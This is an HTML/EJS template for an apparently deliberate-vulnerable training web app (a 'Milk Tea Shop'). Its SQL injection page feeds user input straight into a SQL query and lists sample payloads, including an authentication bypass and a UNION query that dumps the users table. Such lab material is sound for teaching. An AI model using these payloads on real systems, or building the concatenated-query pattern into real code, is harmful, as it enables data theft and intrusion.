<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>A1: SQL Injection - Milk Tea Shop</title>
  <link rel="stylesheet" href="/styles.css">
</head>
<body>
  <div class="container">
    <nav>
      <div class="logo">MilkTea</div>
      <div class="nav-links">
        <a href="/user/dashboard">Home</a>
        <a href="/user/menu">Menu</a>
        <a href="/vuln/sqli" class="active">A1</a>
        <a href="/vuln/auth">A2</a>
        <a href="/vuln/xss">A3</a>
        <a href="/vuln/idor">A4</a>
        <a href="/vuln/config">A5</a>
        <a href="/vuln/data">A6</a>
      </div>
      <div class="nav-right">
        <a href="/logout" class="logout">Logout</a>
      </div>
    </nav>

    <div class="card">
      <span class="vuln-badge critical">⚠ A1: SQL Injection</span>
      <h2>🔍 Customer Search</h2>
      <p style="color:var(--text-muted);margin-bottom:16px;">
        Vulnerable search endpoint. Input is concatenated directly into SQL query.
      </p>

      <div class="alert alert-warning" style="margin-bottom:16px;font-family:monospace;font-size:12px;word-break:break-all;">
        <strong>Vulnerable Query:</strong> <%= sql %>
      </div>

      <form action="/vuln/sqli" method="POST" style="display:flex;gap:12px;align-items:end;">
        <div style="flex:1;">
          <label>Search username</label>
          <input type="text" name="search" placeholder="Enter username or SQL injection payload..." value="<%= query %>" required autofocus>
        </div>
        <button type="submit">Search</button>
        <button type="submit" name="search" value="" class="btn secondary">Reset</button>
      </form>

      <% if (error) { %>
        <div class="alert alert-danger" style="margin-top:16px;">
          <strong>SQL Error:</strong> <%= error %>
        </div>
      <% } %>

      <% if (query && !error && results.length === 0) { %>
        <div class="alert alert-warning" style="margin-top:16px;">No customers found</div>
      <% } %>

      <% if (results.length > 0) { %>
        <div class="table-wrapper" style="margin-top:24px;">
          <table>
            <thead>
              <tr><th>ID</th><th>Username</th><th>Email</th><th>Role</th><th>Balance</th></tr>
            </thead>
            <tbody>
              <% results.forEach(function(r) { %>
                <tr>
                  <td><%= r.id %></td>
                  <td><strong><%= r.username %></strong></td>
                  <td><%= r.email %></td>
                  <td><span class="badge badge-<%= r.role %>"><%= r.role %></span></td>
                  <td style="color:var(--success);">$<%= r.balance %></td>
                </tr>
              <% }); %>
            </tbody>
          </table>
        </div>
        <div class="alert alert-success" style="margin-top:16px;">
          ✓ Query returned <%= results.length %> customer(s)
        </div>
      <% } %>
    </div>

    <div class="card" style="border-color:rgba(255,107,107,0.3);">
      <h3 style="color:var(--danger);">💉 SQL Injection Payloads</h3>
      <p style="color:var(--text-muted);margin-bottom:16px;">Try these payloads in the search bar:</p>

      <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px;">
        <div style="background:rgba(0,0,0,0.2);padding:12px;border-radius:8px;">
          <strong style="color:var(--success);">Boolean-based (OR)</strong>
          <input type="text" readonly value="' OR '1'='1" onclick="this.select()" style="width:100%;margin-top:8px;padding:6px;background:rgba(0,0,0,0.3);border:1px solid rgba(255,255,255,0.1);color:#fff;font-family:monospace;">
          <small style="color:var(--text-muted);">Returns all rows (always true)</small>
        </div>

        <div style="background:rgba(0,0,0,0.2);padding:12px;border-radius:8px;">
          <strong style="color:var(--success);">Comment</strong>
          <input type="text" readonly value="admin'--" onclick="this.select()" style="width:100%;margin-top:8px;padding:6px;background:rgba(0,0,0,0.3);border:1px solid rgba(255,255,255,0.1);color:#fff;font-family:monospace;">
          <small style="color:var(--text-muted);">Bypass password check</small>
        </div>

        <div style="background:rgba(0,0,0,0.2);padding:12px;border-radius:8px;">
          <strong style="color:var(--success);">UNION (5 columns)</strong>
          <input type="text" readonly value="' UNION SELECT 1,2,3,4,5--" onclick="this.select()" style="width:100%;margin-top:8px;padding:6px;background:rgba(0,0,0,0.3);border:1px solid rgba(255,255,255,0.1);color:#fff;font-family:monospace;">
          <small style="color:var(--text-muted);">Test UNION injection</small>
        </div>

        <div style="background:rgba(0,0,0,0.2);padding:12px;border-radius:8px;">
          <strong style="color:var(--success);">UNION (all users)</strong>
          <input type="text" readonly value="' UNION SELECT id,username,email,role,balance FROM users--" onclick="this.select()" style="width:100%;margin-top:8px;padding:6px;background:rgba(0,0,0,0.3);border:1px solid rgba(255,255,255,0.1);color:#fff;font-family:monospace;">
          <small style="color:var(--text-muted);">Dump all users</small>
        </div>

      </div>
    </div>
  </div>
</body>
</html>